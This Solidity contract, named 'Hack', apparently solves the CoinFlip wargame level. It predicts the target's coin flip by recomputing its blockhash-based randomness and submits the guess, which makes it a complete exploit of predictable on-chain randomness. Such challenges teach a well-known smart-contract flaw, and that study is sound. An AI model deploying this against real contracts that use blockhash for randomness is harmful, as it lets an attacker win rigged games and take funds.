// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface ICoinFlip {
    function consecutiveWins() external view returns (uint256);
    function flip(bool) external returns (bool);
}

contract Hack{
    ICoinFlip private immutable contractAddress;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _contractAddress){
        contractAddress = ICoinFlip(_contractAddress);
    }

    function flip() external {
        bool guess = _guess();
        require(contractAddress.flip(guess),"guess failed");
    }

    function _guess() private view returns(bool){
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return side;
    }
}